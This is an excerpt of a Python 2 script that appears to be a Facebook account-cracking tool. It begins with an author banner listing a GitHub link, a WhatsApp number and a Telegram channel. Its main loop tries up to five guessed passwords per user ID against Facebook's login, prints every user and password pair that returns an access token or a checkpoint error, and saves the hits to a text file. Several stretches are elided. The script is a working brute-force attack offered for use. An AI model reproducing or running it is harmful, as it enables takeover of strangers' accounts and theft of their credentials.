...
\033[1;97m       ##     ##    ##    ## #### ##    ##  ######\033[1;0m
\033[1;97m--------------------------------------------------
\033[1;91m Author      : keramat khan
\033[1;91m GitHub      : https://github.com/kramatafg
\033[1;91m whatsapp     : 0703506519
\033[1;91m Telegram CH   : هکرانو مشر
\033[1;91m دنده:استخباراتو
\033[1;97m--------------------------------------------------
"""
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[khan_OK] ' + k + c + user + ' | ' + pass1
                okb = open('Mking.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[khan_OK] ' + k + c + user + ' | ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[khan_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('Mking.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[khan_OK] ' + k + c + user + ' | ' + pass2
                    cps = open('Mking.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[khan_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('Mking.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[khan_OK] ' + k + c + user + ' | ' + pass3
                        cps = open('Mking.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[khan_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('Mking.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[khan_OK] ' + k + c + user + ' | ' + pass4
                            cps = open('Mking.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[khan_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('Mking.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[khan_OK] ' + k + c + user + ' | ' + pass5
                                cps = open('Mking.txt', 'a')
